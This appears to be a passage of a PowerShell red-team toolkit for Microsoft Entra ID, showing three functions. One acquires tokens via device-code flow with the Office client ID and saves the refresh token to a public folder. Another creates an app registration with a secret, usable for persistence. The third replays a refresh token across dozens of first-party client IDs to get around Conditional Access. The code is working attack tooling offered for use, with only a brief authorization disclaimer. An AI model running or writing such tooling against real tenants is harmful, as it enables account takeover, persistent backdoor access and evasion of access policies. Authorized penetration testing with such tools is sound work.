<#
.SYNOPSIS
    Entra ID Collection Tools for Offensive Security Operations

.DESCRIPTION
    This PowerShell collection is designed to support Red Team and penetration testing activities within Microsoft Entra ID (formerly Azure AD) environments.
    The scripts automate enumeration and data extraction tasks to assist with reconnaissance, privilege escalation mapping, and post-exploitation activities.


     Whether you're assessing user visibility, group exposure, role assignments, or token validity — this toolkit aims to streamline offensive operations in the cloud.

.NOTES
    Author: Shaked Wiessman (@ShkudW)
    Use responsibly and only in environments you are authorized to test.
#>



function Invoke-GetTokens {
	

	param(
		[string]$DomainName,
		[string]$ClientID,
		[string]$ClientSecret,
		[string]$TenantID,			
        [switch]$Graph,
        [switch]$ARM,
        [switch]$MethodA,
        [switch]$MethodB		
	)


		function Help {
			Write-Host "Invoke-GetTokens" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-GetTokens -DomainName ShkudW.com -Graph'" -ForegroundColor DarkCyan
            Write-Host "         : Invoke-GetTokens -DomainName ShkudW.com -ARM'" -ForegroundColor DarkCyan
		}
				
            		if (-not $DomainName -and -not $Graph -and -not $ARM -and -not $ClientID -and -not $ClientSecret -and -not $TenantID){
                		Help
                		return
            		}
	             	
	       		    if (-not $DomainName -and -not $TenantID) {
                		Write-Host "[!] You must provide Tenant Domain name or Tenant ID" -ForegroundColor DarkRed
		  		        Write-Host " " 
                		Help
                		return
            		}

            		if ($DomainName -and -not $Graph -and -not $ARM){
                		Write-Host "[!] Please choose between Graph Token or ARM Token" -ForegroundColor DarkRed
                		Write-Host " " 
                		Help
                		return
            		}

            		if ($TenantID -and -not $Graph -and -not $ARM){
                		Write-Host "[!] Please choose between Graph Token or ARM Token" -ForegroundColor DarkRed
                		Write-Host " " 
                		Help
                		return
            		}
                    
            		if ($Graph -and $ARM) {
                		Write-Host "[!] You can select only one API: either -Graph or -ARM, not both." -ForegroundColor DarkRed
		  		        Write-Host " " 
                		Help
                		return
            		}
										


		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                		Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}

        if($DomainName)
			{$TenantID = Get-DomainName 
		}
		
		if($TenantID) {
			$TenantID = $TenantID
		}
			
		$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
		$headers = @{ 'User-Agent' = $UserAgent }

		function Get-Token-WithClientSecret {
            	param(
                	[string]$ClientID,
                	[string]$ClientSecret,
					[string]$TenantID
					
					               
            )
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			if($Graph){
			$body = @{
				"client_id" = $ClientId
				"client_secret" = $ClientSecret
				"scope" = "https://graph.microsoft.com/.default"
				"grant_type" = "client_credentials"
			}
				$Resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers
				return $Resp.access_token
			}
			if($ARM){
				$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"  = "https://management.azure.com/.default"
				"grant_type" = "client_credentials"
			}

				$Resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers
				return $Resp.access_token
					
			}
		}
		
		function Get-Token-WithDeviceCode {
					[string]$TenantID
		
		$deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"

       		$Body = @{
            		"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            		"resource"= "https://graph.microsoft.com"
         		}

			$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $Body
			$code = $authResponse.user_code
			$deviceCode = $authResponse.device_code
			Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
			Write-Host " $code" -ForegroundColor DarkGray
			Start-Sleep -Seconds 5
			Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

			$tokenUrl = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
			$tokenBody = @{
			"scope" = "openid"
			"client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
			"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
			"code" = $deviceCode
		}

		while ($true) {
			try { 
				$tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop -ContentType "application/x-www-form-urlencoded"
				$RefreshToken = $tokenResponse.refresh_token
				Set-Content -Path "C:\Users\Public\Refreshtoken.txt" -Value $RefreshToken
				Write-Host "[>] Refresh Token saved to C:\Users\Public\Refreshtoken.txt" -ForegroundColor DarkGray
				
				if($Graph){
					$AccessToken = $tokenResponse.access_token
					return $AccessToken
				}
				
				if($ARM){
					$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
					$refreshBody = @{
					"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
					"scope" = "https://management.azure.com/.default"
					"grant_type" = "refresh_token"
					"refresh_token" = $RefreshToken
					}
					try {
						$refreshResponse = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBody -Headers $headers -ContentType "application/x-www-form-urlencoded"
						$AccessToken = $refreshResponse.access_token
						return $AccessToken
					}
					catch{
						return $null
					}
				}
                
				$AccessToken1 = $tokenResponse.access_token
				if (!$AccessToken1){
					$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token?api-version=1.0"
					if($Graph) {
						$refreshBody = @{
						"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
						"scope" = "https://graph.microsoft.com/.default"
						"grant_type" = "refresh_token"
						"refresh_token" = $RefreshToken
					}
						try {
							$refreshResponse = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBody -Headers $headers -ContentType "application/x-www-form-urlencoded"
							$AccessToken = $refreshResponse.access_token
							return $AccessToken
						}
						catch{
							return $null
						}
					}

					if($ARM) {
						$refreshBody = @{
						"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
						"scope" = "https://management.azure.com/.default"
						"grant_type" = "refresh_token"
						"refresh_token" = $RefreshToken
					}
						try {
							$refreshResponse = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBody -Headers $headers -ContentType "application/x-www-form-urlencoded"
							$AccessToken = $refreshResponse.access_token
							return $AccessToken
						}
						catch{
							return $null
						}
					}				
				
					}
				
		
			}catch {
				$errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
				if ($errorResponse.error -eq "authorization_pending") {
					Start-Sleep -Seconds 5
				} elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
					Write-Host "`n[-] Authorization failed or expired." -ForegroundColor DarkRed
					return
				} else {
					Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor DarkRed
					return
				}
			}
		}

	}
	
	if($ClientID -and $ClientSecret -and $DomainName -and $Graph){
		Get-Token-WithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
	}
	elseif($ClientID -and $ClientSecret -and $DomainName -and $ARM){
		Get-Token-WithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
	}
	elseif($DomainName -and $Graph -and -not $ClientSecret -and -not $ClientID){
		Get-Token-WithDeviceCode -TenantID $TenantID
	}
	elseif($DomainName -and $ARM -and -not $ClientSecret -and -not $ClientID){
		Get-Token-WithDeviceCode -TenantID $TenantID
	}
	elseif($TenantID -and $ARM -and -not $ClientSecret -and -not $ClientID){
		Get-Token-WithDeviceCode -TenantID $TenantID
	}
	elseif($TenantID -and $Graph -and -not $ClientSecret -and -not $ClientID){
		Get-Token-WithDeviceCode -TenantID $TenantID
	}
}

<###############################################################################################################################################>
<###############################################################################################################################################>


function Invoke-CreateApplication {

    param(
        [Parameter(Mandatory)][string]$DomainName,
        [Parameter(Mandatory)][string]$AppDisplayName,
        [string]$RefreshToken,
        [string]$AccessToken,
        [string]$ClientId,
        [string]$ClientSecret,
        [string]$SecretDisplayName = "Authomation_App_Sync",
        [int]$SecretExpiryDays = 365,
        [switch]$CreateServicePrincipal,
        [array]$RequiredResourceAccess,
        [ValidateSet("AzureADMyOrg","AzureADMultipleOrgs","AzureADandPersonalMicrosoftAccount")]
        [string]$SignInAudience = "AzureADMyOrg"
    )


    function Invoke-SmartRequest {
        param (
            [string]$Method,
            [string]$Uri,
            [hashtable]$Headers,
            $Body = $null,
            [string]$ContentType = $null,
            [int]$MaxRetries = 15
        )

        $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        if (-not $Headers.ContainsKey("User-Agent")) { $Headers["User-Agent"] = $UA }

        $RetryCount = 0
		$Success = $false
		$Response = $null

        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            try {
                $p = @{ Method = $Method; Uri = $Uri; Headers = $Headers }
                if ($null -ne $Body) { $p['Body'] = $Body }
                if ($ContentType)    { $p['ContentType'] = $ContentType }

                $Response = Invoke-RestMethod @p
                $Success  = $true
            } catch {
                $err  = $_
                $code = if ($err.Exception.Response) { [int]$err.Exception.Response.StatusCode } else { $null }

                if ($code -eq 429) {
                    $RetryCount++
                    $ra   = $err.Exception.Response.Headers["Retry-After"]
                    $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) { [int]($ra -join '') } else { 0 }
                    if ($wait -eq 0) { $wait = 10 * $RetryCount }
                    Write-Host "`t[!] 429 Rate Limit - waiting $wait sec" -ForegroundColor Gray
                    Start-Sleep -Seconds $wait
                }
                elseif ($code -eq 401) {
                    Write-Host "`t[!] 401 Unauthorized" -ForegroundColor Yellow
                    throw "[-] Access denied (401). Token may be expired or lacks required permissions."
                }
                elseif ($code -eq 403) {
                    Write-Host "`t[!] 403 Forbidden - $Uri" -ForegroundColor Red
                    throw "[-] Access denied (403). Missing required permissions for this operation."
                }
                elseif ($code -eq 404) { return $null }
                elseif ($null -eq $code -or $code -ge 500) {
                    $RetryCount++
                    $wait = 5 * $RetryCount
                    Write-Host "`t[!] Error ($code). Retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $wait
                }
                else { throw $err }
            }
        }
        if (-not $Success) { throw "[-] Request to $Uri failed after $MaxRetries retries." }
        return $Response
    }

    function Decode-JwtPayload {
        param([string]$Token)
        $parts = $Token.Split('.')
        if ($parts.Count -lt 2) { throw "Invalid JWT" }
        $payload = $parts[1]
        switch ($payload.Length % 4) {
            2 { $payload += "==" }
            3 { $payload += "="  }
        }
        $payload = $payload.Replace('-','+').Replace('_','/')
        $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        return ($json | ConvertFrom-Json)
    }

    function Resolve-TenantId {
        param([string]$DomainName)
        try {
            $r   = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
            $tid = ($r.issuer -split "/")[3]
            Write-Host "[#] Tenant ID for $DomainName -> $tid" -ForegroundColor DarkYellow
            return $tid
        } catch {
            Write-Error "[-] Failed to resolve Tenant ID for $DomainName"
            return $null
        }
    }

    function Build-AuthHeaders {
        param(
            [string]$RefreshToken,
            [string]$AccessToken,
            [string]$TenantID,
            [string]$ClientId,
            [string]$ClientSecret
        )

        $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

        if ($AccessToken) {
            return @{ Authorization = "Bearer $AccessToken"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        if ($RefreshToken) {
            $body = @{
                client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                scope = "https://graph.microsoft.com/.default"
                grant_type = "refresh_token"
                refresh_token = $RefreshToken
            }
            $resp = Invoke-SmartRequest -Method POST -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Body $body -Headers @{ "User-Agent" = $UA }
            Write-Host "[+] Token acquired via RefreshToken" -ForegroundColor Green
            return @{ Authorization = "Bearer $($resp.access_token)"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        if ($ClientId -and $ClientSecret) {
            $body = @{
                client_id = $ClientId
                client_secret = $ClientSecret
                scope = "https://graph.microsoft.com/.default"
                grant_type = "client_credentials"
            }
            $resp = Invoke-SmartRequest -Method POST -Uri "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" -Body $body -Headers @{ "User-Agent" = $UA }
            Write-Host "[+] Token acquired via Client Credentials" -ForegroundColor Green
            return @{ Authorization = "Bearer $($resp.access_token)"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        throw "[-] No valid authentication method provided."
    }

    $authCount = 0
    if ($AccessToken){
		$authCount++ 
	}
    if ($RefreshToken){
		$authCount++ 
	}
    if ($ClientId -and $ClientSecret){
		$authCount++ 
	}

    if ($authCount -eq 0) {
        Write-Host "Invoke-CreateApplication" -ForegroundColor DarkYellow
        Write-Host "  -DomainName <domain> -AppDisplayName <name> -AccessToken <token>"              -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -AppDisplayName <name> -RefreshToken <token>"             -ForegroundColor DarkCyan
        Write-Host "  -DomainName <domain> -AppDisplayName <name> -ClientId <id> -ClientSecret <s>"  -ForegroundColor DarkCyan
        return
    }
    if ($authCount -gt 1) {
        Write-Host "[-] Provide only ONE auth method." -ForegroundColor Red; return
    }

    $TenantID = Resolve-TenantId -DomainName $DomainName
    if (-not $TenantID) { return }

    $headers = Build-AuthHeaders -RefreshToken $RefreshToken -AccessToken $AccessToken -TenantID $TenantID -ClientId $ClientId -ClientSecret $ClientSecret

    $tokenStr = $headers["Authorization"] -replace "^Bearer\s+", ""
    Write-Host "`n[*] Validating caller permissions..." -ForegroundColor Cyan

    $hasPermission = $false
    try {
        $jwt = Decode-JwtPayload -Token $tokenStr

        if ($jwt.roles) {
            $requiredRoles = @("Application.ReadWrite.All", "Directory.ReadWrite.All")
            foreach ($r in $jwt.roles) {
                if ($requiredRoles -contains $r) {
                    Write-Host "[+] Found application permission: $r" -ForegroundColor Green
                    $hasPermission = $true; break
                }
            }
        }

        if (-not $hasPermission -and $jwt.wids) {
            $adminRoleTemplates = @(
                "62e90394-69f5-4237-9190-012177145e10",   # Global Administrator
                "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3",   # Application Administrator
                "158c047a-c907-4556-b7ef-446551a6b5f7"     # Cloud Application Administrator
            )
            foreach ($w in $jwt.wids) {
                if ($adminRoleTemplates -contains $w) {
                    $roleName = switch ($w) {
                        "62e90394-69f5-4237-9190-012177145e10" { "Global Administrator" }
                        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" { "Application Administrator" }
                        "158c047a-c907-4556-b7ef-446551a6b5f7" { "Cloud Application Administrator" }
                    }
                    Write-Host "[+] Found directory role: $roleName" -ForegroundColor Green
                    $hasPermission = $true; break
                }
            }
        }
        if (-not $hasPermission -and $jwt.scp) {
            $scopes = $jwt.scp -split " "
            if ($scopes -contains "Application.ReadWrite.All" -or $scopes -contains "Directory.ReadWrite.All") {
                Write-Host "[+] Found delegated scope: Application.ReadWrite.All" -ForegroundColor Green
                $hasPermission = $true
            }
        }
    } catch {
        Write-Host "[!] Could not decode token. Proceeding anyway (API will reject if unauthorized)." -ForegroundColor Yellow
        $hasPermission = $true
    }

    if (-not $hasPermission) {
        Write-Host ""
        Write-Host "[-] You need some of those api permission:" -ForegroundColor Red
        Write-Host "    - Application permission : Application.ReadWrite.All"        -ForegroundColor DarkGray
        Write-Host "    - Application permission : Directory.ReadWrite.All"          -ForegroundColor DarkGray
        Write-Host "    - Directory role          : Global Administrator"            -ForegroundColor DarkGray
        Write-Host "    - Directory role          : Application Administrator"       -ForegroundColor DarkGray
        Write-Host "    - Directory role          : Cloud Application Administrator" -ForegroundColor DarkGray
        Write-Host ""
        return
    }

    Write-Host "`n[*] Creating Application Registration: $AppDisplayName ..." -ForegroundColor Cyan

    $appBody = @{
        displayName = $AppDisplayName
        signInAudience = $SignInAudience
    }

    if ($RequiredResourceAccess -and $RequiredResourceAccess.Count -gt 0) {
        $appBody["requiredResourceAccess"] = $RequiredResourceAccess
    }

    $appJson = $appBody | ConvertTo-Json -Depth 10

    try {
        $appResp = Invoke-SmartRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $headers -Body $appJson -ContentType "application/json"
    } catch {
        Write-Host "[-] Failed to create application: $_" -ForegroundColor Red
        return
    }

    $newAppObjectId = $appResp.id
    $newAppId = $appResp.appId
    Write-Host "[+] Application created  (objectId: $newAppObjectId, appId: $newAppId)" -ForegroundColor Green

    Write-Host "[*] Waiting for Entra ID replication before adding secret..." -ForegroundColor Cyan

    $endDate = (Get-Date).AddDays($SecretExpiryDays).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")

    $secretBody = @{
        passwordCredential = @{
            displayName = $SecretDisplayName
            endDateTime = $endDate
        }
    } | ConvertTo-Json -Depth 5

    $secretResp = $null
    $maxAttempts = 10
    $attemptCount  = 0
    $baseDelay = 5   # seconds

    while ($attemptCount -lt $maxAttempts) {
        $attemptCount++

        if ($attemptCount -eq 1) {
            $waitSec = $baseDelay
        } else {
            $waitSec = $baseDelay * $attemptCount
        }
        Write-Host "`t[~] Attempt $attemptCount/$maxAttempts - waiting $waitSec sec..." -ForegroundColor Gray
        Start-Sleep -Seconds $waitSec

        try {
            $secretResp = Invoke-RestMethod -Method POST -Uri "https://graph.microsoft.com/v1.0/applications/$newAppObjectId/addPassword" -Headers $headers -Body $secretBody -ContentType "application/json"

            if ($secretResp -and $secretResp.secretText) {
                Write-Host "[+] Secret added successfully" -ForegroundColor Green
                break
            }
        } catch {
            $errCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { $null }

            if ($errCode -eq 404) {
                Write-Host "`t[!] 404 - Application not yet replicated, retrying..." -ForegroundColor Yellow
                $secretResp = $null
                continue
            }
            elseif ($errCode -eq 429) {
                $ra   = $_.Exception.Response.Headers["Retry-After"]
                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) { [int]($ra -join '') } else { 15 }
                Write-Host "`t[!] 429 Rate Limit - waiting $wait sec" -ForegroundColor Gray
                Start-Sleep -Seconds $wait
                continue
            }
            else {
                Write-Host "[-] Failed to add secret (HTTP $errCode): $_" -ForegroundColor Red
				return
            }
        }
    }

    if (-not $secretResp -or -not $secretResp.secretText) {
        Write-Host "[-] Failed to add secret after $maxAttempts attempts (replication timeout)." -ForegroundColor Red
		return
    }



    $spObjectId = $null
    if ($CreateServicePrincipal) {
        Write-Host "[*] Creating Service Principal..." -ForegroundColor Cyan

        $spBody = @{ appId = $newAppId } | ConvertTo-Json

        try {
            $spResp = Invoke-SmartRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" -Headers $headers -Body $spBody -ContentType "application/json"
            $spObjectId = $spResp.id
            Write-Host "[+] Service Principal created  (objectId: $spObjectId)" -ForegroundColor Green
        } catch {
            Write-Host "[!] Failed to create Service Principal: $_" -ForegroundColor Yellow
        }
    }

    Write-Host ""
    Write-Host " [+] Great!!!!!"	-ForegroundColor DarkYellow
    Write-Host " - - - - - - - "
    Write-Host "   [*] Display Name 	: $AppDisplayName" -ForegroundColor White
	Write-Host "   [*] Tenant ID        : $TenantID" -ForegroundColor Gray
    Write-Host "   [*] App Object ID    : $newAppObjectId" -ForegroundColor Gray
    Write-Host "   [*] App (Client) ID  : $newAppId" -ForegroundColor DarkYellow
    Write-Host "   [*] Secret Value     : $($secretResp.secretText)"-ForegroundColor DarkYellow
    Write-Host "   [*] Secret Key ID    : $($secretResp.keyId)" -ForegroundColor Gray
    Write-Host "   [*] Secret Expiry    : $($secretResp.endDateTime)"  -ForegroundColor Gray
    Write-Host ""
}

<###############################################################################################################################################>
<###############################################################################################################################################>


function Invoke-CheckCABypass {
	

	
    param (
        [string]$DomainName,
        [string]$RefreshToken
    )

        $ClientIDs = @{
            "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
            "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
            "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Office UWP PWA"
            "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
            "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
            "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
            "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
            "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
            "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
            "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
            "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
            "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
            "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
            "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
            "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
            "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
            "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
            "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
            "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
            "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
            "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
            "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
            "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
            "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
            "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsfot Intune Company Portal"
            "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
            "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
            "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
            "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
            "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
            "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
            "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
            "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
            "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
            "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
            "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
            "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
            "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
            "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
            "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
            "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
            "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
            "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
            "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
            "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
            "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
            "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
            "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
        }

        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }

		function Help {
			Write-Host "Invoke-CheckCABypass" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-CheckCABypass -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkCyan
		}

            if (-not $DomainName -and -not $RefreshToken){
                Help
                return
            }

            if ($DomainName -and -not $RefreshToken){
                Write-Host "[!] You need to provide a Refresh Token" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }
		
		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                		Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}

        if($DomainName)	{$TenantID = Get-DomainName}
		
        foreach ($ClientID in $ClientIDs.Keys) {
                Write-Host "`n[*] Trying Client ID: $ClientID ($($ClientIDs[$ClientID]))..." -ForegroundColor DarkCyan
                $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                $body = @{
                    "client_id"     = $ClientID
                    "scope"         = "https://management.azure.com/.default"
                    "grant_type"   = "refresh_token"
                    "refresh_token" = $RefreshToken
                }

                try {
                    $response = Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
                    $AccessToken = $response.access_token
                    if ($AccessToken) {
                        Write-Host "[^.^] Access Token for ARM API with Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGreen
                        Write-Host "Access Token: $AccessToken" -ForegroundColor DarkGreen
                    } else {
                        Write-Host "[-] No access token received for Client ID: $ClientID" -ForegroundColor DarkRed
                    }

                } catch {
                    $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json
                    if ($errorMessage.error_description -match "AADSTS53003") {
                        Write-Host "[!#!] Probably Blocked by Conditional Access - Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkCyan
                    }
                    elseif ($errorMessage.error_description -match "AADSTS70000") {
                    Write-Host "[!] Invalid or Malformed Grant - Refresh token likely not valid for Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGray
                    Write-Host "[>] Device Code Flow with Client ID: $ClientID for trying to bypass continental access" -ForegroundColor DarkYellow
                    $deviceCodeUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode"
                    $deviceBody = @{
                    client_id = $ClientID
                    scope     = "offline_access https://management.azure.com/.default"
                    #"Resource"     = "https://management.azure.com"
                    }

                    try {
                        $deviceResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $deviceBody -Headers $headers
                        Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
                        Write-Host " $($deviceResponse.user_code)" -ForegroundColor DarkGray
                        Start-Process $deviceResponse.verification_uri

                        $userInput = Read-Host "[...] Press Enter to continue polling, or type 'skip' to skip this client"
                        if ($userInput -eq "skip") {
                            Write-Host "[>] Skipping Client ID: $ClientID" -ForegroundColor DarkCyan
                        continue
                        }

                        $pollBody = @{
                            grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
                            client_id   = $ClientID
                            device_code = $deviceResponse.device_code
                        }

                        while ($true) {
                            try {
                                $pollResponse = Invoke-RestMethod -Method POST -Uri $url -Body $pollBody -Headers $headers -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
                                $AccessToken = $pollResponse.access_token
                                Write-Host "[^.^] New Access Token granted with Client ID: $ClientID" -ForegroundColor DarkGreen
                                Write-Host "Access Token: $AccessToken" -ForegroundColor DarkGreen
                                break
                            } catch {
                                $inner = $_.ErrorDetails.Message | ConvertFrom-Json
                                if ($inner.error -eq "authorization_pending") {
                                    Start-Sleep -Seconds 5
                                } elseif ($inner.error -eq "authorization_declined" -or $inner.error -eq "expired_token") {
                                    Write-Host "[-] Authorization failed or expired for Client ID: $ClientID" -ForegroundColor DarkRed
                                    break
                                } else {
                                    Write-Host "[-] Polling error: $($inner.error_description)" -ForegroundColor DarkRed
                                    break
                                }
                            }
                        }

                    } catch {
                        Write-Host "[-] Device Code flow failed for Client ID: $ClientID - $($_.Exception.Message)" -ForegroundColor DarkRed
                    }

                    } else {
                    Write-Host "[-] Unhandled error for Client ID: $ClientID - $($errorMessage.error_description)" -ForegroundColor DarkRed
                    }
                }   
            Start-Sleep -Milliseconds 500
        }
}


<###############################################################################################################################################>
<###############################################################################################################################################>

function Invoke-FindDynamicGroups {
		

	
	param (
        	[Parameter(Mandatory = $false)] [string]$RefreshToken,
        	[Parameter(Mandatory = $false)] [switch]$DeviceCodeFlow,
		    [Parameter(Mandatory = $false)] [string]$ClientID,
